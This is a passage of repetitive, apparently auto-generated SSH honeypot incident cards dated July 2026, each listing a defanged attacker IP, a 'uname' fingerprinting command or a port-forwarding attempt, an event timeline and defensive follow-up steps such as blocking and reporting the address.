- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d5094895f4b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:18 |
| **Last Seen** | 2026-07-28 05:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:18:29` | `cowrie.session.connect` |
| `2026-07-28 05:18:29` | `cowrie.client.version` |
| `2026-07-28 05:18:29` | `cowrie.client.kex` |
| `2026-07-28 05:18:29` | `cowrie.login.success` |
| `2026-07-28 05:18:30` | `cowrie.session.params` |
| `2026-07-28 05:18:30` | `cowrie.command.input` |
| `2026-07-28 05:18:30` | `cowrie.log.closed` |
| `2026-07-28 05:18:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-531b38df7bc2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:18 |
| **Last Seen** | 2026-07-28 05:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:18:34` | `cowrie.session.connect` |
| `2026-07-28 05:18:35` | `cowrie.client.version` |
| `2026-07-28 05:18:35` | `cowrie.client.kex` |
| `2026-07-28 05:18:36` | `cowrie.login.success` |
| `2026-07-28 05:18:37` | `cowrie.session.params` |
| `2026-07-28 05:18:37` | `cowrie.command.input` |
| `2026-07-28 05:18:37` | `cowrie.log.closed` |
| `2026-07-28 05:18:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdb66f05bf15

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:18 |
| **Last Seen** | 2026-07-28 05:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:18:41` | `cowrie.session.connect` |
| `2026-07-28 05:18:41` | `cowrie.client.version` |
| `2026-07-28 05:18:41` | `cowrie.client.kex` |
| `2026-07-28 05:18:41` | `cowrie.login.success` |
| `2026-07-28 05:18:43` | `cowrie.session.params` |
| `2026-07-28 05:18:43` | `cowrie.command.input` |
| `2026-07-28 05:18:43` | `cowrie.log.closed` |
| `2026-07-28 05:18:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1456ef13447c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:18 |
| **Last Seen** | 2026-07-28 05:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:18:47` | `cowrie.session.connect` |
| `2026-07-28 05:18:47` | `cowrie.client.version` |
| `2026-07-28 05:18:47` | `cowrie.client.kex` |
| `2026-07-28 05:18:47` | `cowrie.login.success` |
| `2026-07-28 05:18:48` | `cowrie.session.params` |
| `2026-07-28 05:18:48` | `cowrie.command.input` |
| `2026-07-28 05:18:49` | `cowrie.log.closed` |
| `2026-07-28 05:18:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16468005cd7f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:18 |
| **Last Seen** | 2026-07-28 05:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:18:52` | `cowrie.session.connect` |
| `2026-07-28 05:18:52` | `cowrie.client.version` |
| `2026-07-28 05:18:52` | `cowrie.client.kex` |
| `2026-07-28 05:18:53` | `cowrie.login.success` |
| `2026-07-28 05:18:54` | `cowrie.session.params` |
| `2026-07-28 05:18:54` | `cowrie.command.input` |
| `2026-07-28 05:18:54` | `cowrie.log.closed` |
| `2026-07-28 05:18:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0afcaca7ce77

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:18 |
| **Last Seen** | 2026-07-28 05:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:18:58` | `cowrie.session.connect` |
| `2026-07-28 05:18:59` | `cowrie.client.version` |
| `2026-07-28 05:18:59` | `cowrie.client.kex` |
| `2026-07-28 05:19:00` | `cowrie.login.success` |
| `2026-07-28 05:19:01` | `cowrie.session.params` |
| `2026-07-28 05:19:01` | `cowrie.command.input` |
| `2026-07-28 05:19:01` | `cowrie.log.closed` |
| `2026-07-28 05:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b26230b99a4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:19 |
| **Last Seen** | 2026-07-28 05:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:19:04` | `cowrie.session.connect` |
| `2026-07-28 05:19:04` | `cowrie.client.version` |
| `2026-07-28 05:19:04` | `cowrie.client.kex` |
| `2026-07-28 05:19:06` | `cowrie.login.success` |
| `2026-07-28 05:19:07` | `cowrie.session.params` |
| `2026-07-28 05:19:07` | `cowrie.command.input` |
| `2026-07-28 05:19:07` | `cowrie.log.closed` |
| `2026-07-28 05:19:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6f90f395ce8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:19 |
| **Last Seen** | 2026-07-28 05:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:19:10` | `cowrie.session.connect` |
| `2026-07-28 05:19:11` | `cowrie.client.version` |
| `2026-07-28 05:19:11` | `cowrie.client.kex` |
| `2026-07-28 05:19:12` | `cowrie.login.success` |
| `2026-07-28 05:19:13` | `cowrie.session.params` |
| `2026-07-28 05:19:13` | `cowrie.command.input` |
| `2026-07-28 05:19:13` | `cowrie.log.closed` |
| `2026-07-28 05:19:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57e2fba7e7ee

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:19 |
| **Last Seen** | 2026-07-28 05:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:19:16` | `cowrie.session.connect` |
| `2026-07-28 05:19:16` | `cowrie.client.version` |
| `2026-07-28 05:19:16` | `cowrie.client.kex` |
| `2026-07-28 05:19:17` | `cowrie.login.success` |
| `2026-07-28 05:19:18` | `cowrie.session.params` |
| `2026-07-28 05:19:18` | `cowrie.command.input` |
| `2026-07-28 05:19:18` | `cowrie.log.closed` |
| `2026-07-28 05:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a07cdd9976f1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:19 |
| **Last Seen** | 2026-07-28 05:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:19:22` | `cowrie.session.connect` |
| `2026-07-28 05:19:22` | `cowrie.client.version` |
| `2026-07-28 05:19:22` | `cowrie.client.kex` |
| `2026-07-28 05:19:23` | `cowrie.login.success` |
| `2026-07-28 05:19:24` | `cowrie.session.params` |
| `2026-07-28 05:19:24` | `cowrie.command.input` |
| `2026-07-28 05:19:24` | `cowrie.log.closed` |
| `2026-07-28 05:19:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-462c889c3985

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:19 |
| **Last Seen** | 2026-07-28 05:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:19:28` | `cowrie.session.connect` |
| `2026-07-28 05:19:28` | `cowrie.client.version` |
| `2026-07-28 05:19:28` | `cowrie.client.kex` |
| `2026-07-28 05:19:30` | `cowrie.login.success` |
| `2026-07-28 05:19:31` | `cowrie.session.params` |
| `2026-07-28 05:19:31` | `cowrie.command.input` |
| `2026-07-28 05:19:31` | `cowrie.log.closed` |
| `2026-07-28 05:19:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-787755c20804

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:19 |
| **Last Seen** | 2026-07-28 05:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:19:34` | `cowrie.session.connect` |
| `2026-07-28 05:19:34` | `cowrie.client.version` |
| `2026-07-28 05:19:34` | `cowrie.client.kex` |
| `2026-07-28 05:19:35` | `cowrie.login.success` |
| `2026-07-28 05:19:36` | `cowrie.session.params` |
| `2026-07-28 05:19:36` | `cowrie.command.input` |
| `2026-07-28 05:19:36` | `cowrie.log.closed` |
| `2026-07-28 05:19:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbf50b38583c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:19 |
| **Last Seen** | 2026-07-28 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:19:40` | `cowrie.session.connect` |
| `2026-07-28 05:19:40` | `cowrie.client.version` |
| `2026-07-28 05:19:40` | `cowrie.client.kex` |
| `2026-07-28 05:19:41` | `cowrie.login.success` |
| `2026-07-28 05:19:41` | `cowrie.session.params` |
| `2026-07-28 05:19:41` | `cowrie.command.input` |
| `2026-07-28 05:19:41` | `cowrie.log.closed` |
| `2026-07-28 05:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b00b87576914

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:19 |
| **Last Seen** | 2026-07-28 05:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:19:47` | `cowrie.session.connect` |
| `2026-07-28 05:19:47` | `cowrie.client.version` |
| `2026-07-28 05:19:47` | `cowrie.client.kex` |
| `2026-07-28 05:19:48` | `cowrie.login.success` |
| `2026-07-28 05:19:49` | `cowrie.session.params` |
| `2026-07-28 05:19:49` | `cowrie.command.input` |
| `2026-07-28 05:19:49` | `cowrie.log.closed` |
| `2026-07-28 05:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b7c6a4f90c5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:19 |
| **Last Seen** | 2026-07-28 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:19:52` | `cowrie.session.connect` |
| `2026-07-28 05:19:52` | `cowrie.client.version` |
| `2026-07-28 05:19:52` | `cowrie.client.kex` |
| `2026-07-28 05:19:53` | `cowrie.login.success` |
| `2026-07-28 05:19:54` | `cowrie.session.params` |
| `2026-07-28 05:19:54` | `cowrie.command.input` |
| `2026-07-28 05:19:54` | `cowrie.log.closed` |
| `2026-07-28 05:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78b5d472fbc0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:19 |
| **Last Seen** | 2026-07-28 05:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:19:58` | `cowrie.session.connect` |
| `2026-07-28 05:19:58` | `cowrie.client.version` |
| `2026-07-28 05:19:58` | `cowrie.client.kex` |
| `2026-07-28 05:19:59` | `cowrie.login.success` |
| `2026-07-28 05:20:00` | `cowrie.session.params` |
| `2026-07-28 05:20:00` | `cowrie.command.input` |
| `2026-07-28 05:20:00` | `cowrie.log.closed` |
| `2026-07-28 05:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f0da090fe82

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:20 |
| **Last Seen** | 2026-07-28 05:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:20:05` | `cowrie.session.connect` |
| `2026-07-28 05:20:05` | `cowrie.client.version` |
| `2026-07-28 05:20:05` | `cowrie.client.kex` |
| `2026-07-28 05:20:05` | `cowrie.login.success` |
| `2026-07-28 05:20:06` | `cowrie.session.params` |
| `2026-07-28 05:20:06` | `cowrie.command.input` |
| `2026-07-28 05:20:06` | `cowrie.log.closed` |
| `2026-07-28 05:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd25d9ff466e

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-28 05:20 |
| **Last Seen** | 2026-07-28 05:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:20:11` | `cowrie.session.connect` |
| `2026-07-28 05:20:11` | `cowrie.client.version` |
| `2026-07-28 05:20:11` | `cowrie.client.kex` |
| `2026-07-28 05:20:11` | `cowrie.login.success` |
| `2026-07-28 05:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a31bbe6ae111

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:20 |
| **Last Seen** | 2026-07-28 05:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:20:11` | `cowrie.session.connect` |
| `2026-07-28 05:20:11` | `cowrie.client.version` |
| `2026-07-28 05:20:11` | `cowrie.client.kex` |
| `2026-07-28 05:20:12` | `cowrie.login.success` |
| `2026-07-28 05:20:13` | `cowrie.session.params` |
| `2026-07-28 05:20:13` | `cowrie.command.input` |
| `2026-07-28 05:20:14` | `cowrie.log.closed` |
| `2026-07-28 05:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f748b7b93d32

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-28 05:20 |
| **Last Seen** | 2026-07-28 05:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:20:12` | `cowrie.session.connect` |
| `2026-07-28 05:20:12` | `cowrie.client.version` |
| `2026-07-28 05:20:12` | `cowrie.client.kex` |
| `2026-07-28 05:20:12` | `cowrie.login.success` |
| `2026-07-28 05:20:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba031d311739

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:20 |
| **Last Seen** | 2026-07-28 05:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:20:17` | `cowrie.session.connect` |
| `2026-07-28 05:20:17` | `cowrie.client.version` |
| `2026-07-28 05:20:17` | `cowrie.client.kex` |
| `2026-07-28 05:20:19` | `cowrie.login.success` |
| `2026-07-28 05:20:21` | `cowrie.session.params` |
| `2026-07-28 05:20:21` | `cowrie.command.input` |
| `2026-07-28 05:20:21` | `cowrie.log.closed` |
| `2026-07-28 05:20:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ced830c83e9

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-28 05:20 |
| **Last Seen** | 2026-07-28 05:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:20:18` | `cowrie.session.connect` |
| `2026-07-28 05:20:18` | `cowrie.client.version` |
| `2026-07-28 05:20:18` | `cowrie.client.kex` |
| `2026-07-28 05:20:19` | `cowrie.login.success` |
| `2026-07-28 05:20:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25f7545ca91b

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-28 05:20 |
| **Last Seen** | 2026-07-28 05:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:20:19` | `cowrie.session.connect` |
| `2026-07-28 05:20:19` | `cowrie.client.version` |
| `2026-07-28 05:20:19` | `cowrie.client.kex` |
| `2026-07-28 05:20:20` | `cowrie.login.success` |
| `2026-07-28 05:20:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a494d66fe7c

| Field | Detail |
|---|---|
| **Source IP** | `61.12.86[.]90` |
| **First Seen** | 2026-07-28 05:20 |
| **Last Seen** | 2026-07-28 05:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:20:21` | `cowrie.session.connect` |
| `2026-07-28 05:20:21` | `cowrie.client.version` |
| `2026-07-28 05:20:21` | `cowrie.client.kex` |
| `2026-07-28 05:20:23` | `cowrie.login.success` |
| `2026-07-28 05:20:24` | `cowrie.direct-tcpip.request` |
| `2026-07-28 05:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.86[.]90` to AbuseIPDB if not already reported
- [ ] Block `61.12.86[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-453a3522b8db

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:20 |
| **Last Seen** | 2026-07-28 05:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:20:23` | `cowrie.session.connect` |
| `2026-07-28 05:20:23` | `cowrie.client.version` |
| `2026-07-28 05:20:23` | `cowrie.client.kex` |
| `2026-07-28 05:20:27` | `cowrie.login.success` |
| `2026-07-28 05:20:29` | `cowrie.session.params` |
| `2026-07-28 05:20:29` | `cowrie.command.input` |
| `2026-07-28 05:20:29` | `cowrie.log.closed` |
| `2026-07-28 05:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-565c3c1c3ad8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:20 |
| **Last Seen** | 2026-07-28 05:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:20:29` | `cowrie.session.connect` |
| `2026-07-28 05:20:30` | `cowrie.client.version` |
| `2026-07-28 05:20:30` | `cowrie.client.kex` |
| `2026-07-28 05:20:32` | `cowrie.login.success` |
| `2026-07-28 05:20:34` | `cowrie.session.params` |
| `2026-07-28 05:20:34` | `cowrie.command.input` |
| `2026-07-28 05:20:34` | `cowrie.log.closed` |
| `2026-07-28 05:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60286cca94c2

| Field | Detail |
|---|---|
| **Source IP** | `213.130.207[.]177` |
| **First Seen** | 2026-07-28 05:20 |
| **Last Seen** | 2026-07-28 05:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
